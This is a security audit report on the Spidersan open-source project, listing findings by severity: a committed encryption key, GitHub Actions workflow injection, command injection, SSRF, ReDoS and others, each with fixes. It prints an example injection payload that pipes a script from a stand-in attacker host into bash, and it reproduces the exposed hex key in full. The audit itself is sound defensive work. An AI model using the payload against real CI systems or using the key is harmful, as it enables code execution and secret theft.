# Security Audit Report — Spidersan OSS

**Date:** 2026-04-06  
**Scope:** Full source tree (`src/`, `mcp-server/`, `scripts/`, `.github/workflows/`, config files)  
**Methodology:** Manual static analysis of all source files

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 1     |
| High     | 2     |
| Medium   | 8     |
| Low      | 7     |

The core library code demonstrates generally **strong security practices**: `execFileSync` is used consistently instead of `exec` (preventing shell injection), input validation exists for agent IDs/branch names/file paths, prototype pollution guards are in place, and TUI injection is mitigated in the dashboard. However, critical issues were found in scripts and CI/CD configuration.

---

## Critical Severity

### 1. Hardcoded Cryptographic Key Committed to Repository

**File:** `scripts/toak-mcp-wrapper.sh:6`

```bash
export ENVOAK_KEY="d7edd0aa19a983c449135310822a33cb4971f8b41122bd2d37785940304a0789"
```

**Issue:** A 256-bit hex key used for decrypting `config.enc` is hardcoded in a committed script. The encrypted config file (`config.enc`) is also committed to the repository. Together, these constitute a **full secret compromise** — anyone with repo access can decrypt all secrets (including `HUB_URL`, `TOAK_AGENT_ID`, and potentially other credentials). This key has been exposed in git history even if removed now.

**Recommendation:** Immediately rotate all secrets encrypted by this key. Remove both `config.enc` and the wrapper script from the repository and git history. Use a secrets manager or environment-specific injection instead.

---

## High Severity

### 2. GitHub Actions Workflow Injection

**File:** `.github/workflows/auto-register.yml:45-46`

```yaml
run: |
  AUTHOR="${{ github.actor }}"
  BRANCH="${{ github.ref_name }}"
```

**Issue:** `github.actor` and `github.ref_name` are injected directly into a `run:` shell block without sanitization. An attacker can craft a GitHub username containing shell metacharacters (e.g., `"; curl attacker.com/shell.sh | bash #`) to achieve arbitrary command execution in the CI runner with access to repository secrets (`SUPABASE_URL`, `SUPABASE_KEY`, etc.).

**Recommendation:** Pass these values via the `env:` block instead of direct interpolation:
```yaml
env:
  AUTHOR: ${{ github.actor }}
  BRANCH: ${{ github.ref_name }}
run: |
  echo "author=$AUTHOR" >> $GITHUB_OUTPUT
```

---

### 3. Command Injection in Stress Test Script

**File:** `scripts/stress-test-scenarios.js:23`

```javascript
const result = execSync(`node dist/bin/spidersan.js ${args}`, { ... });
```

**Issue:** Uses `execSync` with string interpolation instead of `execFileSync` with argument arrays. While `args` currently comes from hardcoded test strings, this is the only place in the codebase that uses this dangerous pattern. If test scenarios were ever modified to accept external input, this becomes immediately exploitable for arbitrary command execution.

**Recommendation:** Replace with `execFileSync('node', ['dist/bin/spidersan.js', ...args.split(' ')])` or use `execFileSync` with proper argument arrays.

---

## Medium Severity

### 4. SSRF via User-Controlled `HUB_URL` / `SUPABASE_URL`

**Files:**
- `src/commands/conflicts.ts:25`
- `src/commands/watch.ts:12`
- `src/commands/torrent.ts:15`
- `src/storage/supabase.ts:54`
- `src/lib/activity.ts:196`
- `src/lib/colony-subscriber.ts:77`

**Issue:** URLs from environment variables (`HUB_URL`, `SUPABASE_URL`) or `.spidersanrc` config are used directly in `fetch()` calls with no allow-list validation. An attacker who controls these values can redirect requests to arbitrary servers (including cloud metadata endpoints like `http://169.254.169.254/`), exfiltrating API keys sent in `Authorization` headers.

**Recommendation:** Validate URLs against an allow-list or at minimum require HTTPS and block RFC 1918 / link-local addresses.

---

### 5. ReDoS via Config-Supplied Regex Patterns

**Files:**
- `src/lib/config.ts:266-280` (`getWipPatterns`, `getHighSeverityPatterns`, `getMediumSeverityPatterns`)
- `src/commands/conflicts.ts:403-404`
- `src/commands/pulse.ts:85-86`

**Issue:** User-supplied strings from `.spidersanrc` are compiled directly into `new RegExp()` without safe-regex validation. A malicious pattern like `(a+)+$` causes catastrophic backtracking, freezing the process. In shared-repo scenarios, a malicious `.spidersanrc` committed to the repo affects all users.

**Recommendation:** Wrap `new RegExp()` in try/catch, add a timeout for regex execution, or validate patterns with a safe-regex library.

---

### 6. PostgREST Query Parameter Injection in Supabase Storage

**File:** `src/storage/supabase.ts:231,346`

**Issue:** In the `cleanup` and `pushRegistry` methods, branch names are `encodeURIComponent`-encoded but Supabase PostgREST uses commas as delimiters in `in.(...)` operators. An encoded comma (`%2C`) or closing parenthesis (`%29`) could break out of the filter at the PostgREST layer, modifying query scope.

**Recommendation:** Strip or reject branch names containing `,`, `(`, `)` before building PostgREST filter strings (as `findByFiles` already does for its inputs).

---

### 7. Force Unlock Without Authentication in MCP Server

**File:** `mcp-server/src/server.ts:703-728`

**Issue:** The `unlock_files` MCP tool accepts a `force` boolean parameter described as "admin only" but with no actual authentication or authorization check. Any MCP client can send `force: true` to bypass agent/token validation and unlock any file lock, undermining the entire locking mechanism.

**Recommendation:** Remove the `force` flag or implement proper authorization (e.g., require a separate admin token).

---

### 8. TUI Markup Injection in `screen.ts`

**File:** `src/tui/screen.ts:108-118`

```typescript
content += `${status} {bold}${branch.name}{/bold}\n`;
content += `   Agent: ${branch.agent || 'unknown'}\n`;
content += `   Files: ${files.join(', ')}\n`;
```

**Issue:** Unlike `dashboard.ts` which properly uses `escapeBlessed()`, `screen.ts` directly interpolates `branch.name`, `branch.agent`, and file paths into blessed markup strings. A malicious branch name containing `{` and `}` could inject blessed markup tags, causing UI corruption or misleading display.

**Recommendation:** Apply `escapeBlessed()` to all dynamic content before rendering, consistent with `dashboard.ts`.

---

### 9. Prototype Pollution Guard Uses `for...in` Without `hasOwnProperty`

**File:** `src/lib/config.ts:245-264`

**Issue:** The `deepMerge` function guards against `__proto__`, `constructor`, and `prototype` keys, but iterates with `for...in` without checking `Object.hasOwn(source, key)`. If a prototype upstream has been polluted, inherited enumerable properties could leak into the result.

**Recommendation:** Use `Object.keys(source)` or add `Object.hasOwn(source, key)` guard.

---

### 10. Unsanitized Colony Payload Used in Storage Operations

**File:** `src/lib/colony-subscriber.ts:155-169`

**Issue:** Payloads from the Supabase `colony_signals` table are parsed with `JSON.parse` and used directly in branch registration (`payload.branch`, `payload.files`) without schema validation. A malicious colony signal could inject arbitrary branch names or file paths into local state.

**Recommendation:** Validate colony payloads against the same validators used for local input (`validateBranchName`, `validateFilePath`).

---

### 11. License Generation Script Committed Despite "DO NOT COMMIT" Warning

**File:** `scripts/generate-license.mjs`

**Issue:** The script header says "KEEP PRIVATE - DO NOT COMMIT" and "Store this script securely, NOT in the repo," yet it is committed. When run, it writes private signing keys to `./license-keys.json` in the working directory.

**Recommendation:** Remove from repository and add to `.gitignore`.

---

## Low Severity

### 12. Regex Injection in `upsertEnvVar`

**File:** `src/commands/config.ts:112`

**Issue:** The `key` parameter is interpolated into `new RegExp()` without escaping. Currently safe (keys are hardcoded), but fragile if the function is ever called with user input.

---

### 13. Fragile Path Construction in `stale.ts`

**File:** `src/commands/stale.ts:30-34`

**Issue:** Uses `../${agentId}/` in path construction. The agent ID validation regex is currently restrictive enough, but the pattern of navigating outside the project via `../` + user input is inherently risky.

---

### 14. Known Public Keys File Missing Restrictive Permissions

**File:** `src/lib/crypto.ts:132`

**Issue:** `known_keys.json` is written without restrictive file permissions (unlike private keys which use `0o600`). An attacker with write access to `~/.spidersan/keys/` could substitute public keys to MITM agent-to-agent encrypted messaging.

---

### 15. No Distinction Between Anon and Service-Role Supabase Keys

**Files:** `src/storage/supabase.ts:53-65`, `src/lib/activity.ts:196-211`

**Issue:** The code does not validate whether `SUPABASE_KEY` is an anon key or service_role key. A service_role key bypasses all Row Level Security policies. The key is also stored in plain text in `.spidersanrc`.

---

### 16. Race Condition in Local Storage (TOCTOU)

**File:** `src/storage/local.ts:40-51`

**Issue:** Load-modify-save pattern with no file locking. Concurrent processes can silently lose writes (last writer wins).

---

### 17. Incomplete `validateWatchDirectory` Blocklist

**File:** `mcp-server/src/server.ts:25-44`

**Issue:** The sensitive directory blocklist doesn't cover `/proc`, `/sys`, `/dev`, `~/.ssh`, `~/.gnupg`, `~/.aws`, or macOS system paths. An allowlist approach would be more secure.

---

### 18. `doctor.ts` Uses `sh -c` for Shell Command

**File:** `src/commands/doctor.ts:483`

**Issue:** Uses `execFileSync('sh', ['-c', 'ulimit -n'])`. The command is hardcoded so not exploitable, but sets a pattern that could be dangerous if copied with user input.

---

## Positive Security Findings

- **No shell injection in core code:** `execFileSync` with argument arrays used consistently throughout `src/` and `mcp-server/`.
- **Input validation:** `src/lib/security.ts` provides robust validation for agent IDs, branch names, task IDs, and file paths, used consistently across commands.
- **Prototype pollution awareness:** `deepMerge`, `setNestedValue`, and `getNestedValue` all block `__proto__`, `constructor`, `prototype`.
- **TUI injection prevention:** `escapeBlessed()` sanitizes data before rendering in `dashboard.ts`.
- **Shell escaping:** `queen.ts` uses `escapeShellString()` for generated bash scripts.
- **Path traversal protection:** `validateRepoPath()` and `validateFilePath()` block `..` traversal.
- **Zod validation in MCP server:** All MCP tool inputs are validated with Zod schemas.
- **Good crypto:** TweetNaCl with X25519 + XSalsa20-Poly1305; private keys saved with `mode: 0o600`.
- **Repo root enforcement:** MCP server's `request_resolution` validates file reads stay within repo root using `realpathSync`.
- **Branch name validation:** MCP server validates branch names via `git check-ref-format`.
